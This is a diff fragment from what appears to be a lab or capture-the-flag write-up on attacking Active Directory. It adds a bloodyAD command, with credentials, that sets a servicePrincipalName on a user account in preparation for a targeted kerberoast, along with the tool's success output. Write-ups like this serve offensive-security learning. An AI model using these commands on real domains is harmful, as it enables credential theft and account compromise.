@@ -678,6 +678,13 @@ Ill first perform an encryption downgrade, using my genericwrite on the user
 
 It could have already been set properly, but after trying a kerberoast attack on a previous user and failing due to encryption type i figured id just change it anyway
 
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u oscar.mazerath -p 'Password123!' -k set object 'ryan.cole' servicePrincipalName -v 'you/hacked'    
+[+] ryan.cole's servicePrincipalName has been updated
 ```
+
+The ill set the SPN
+
+```python
 
 ```
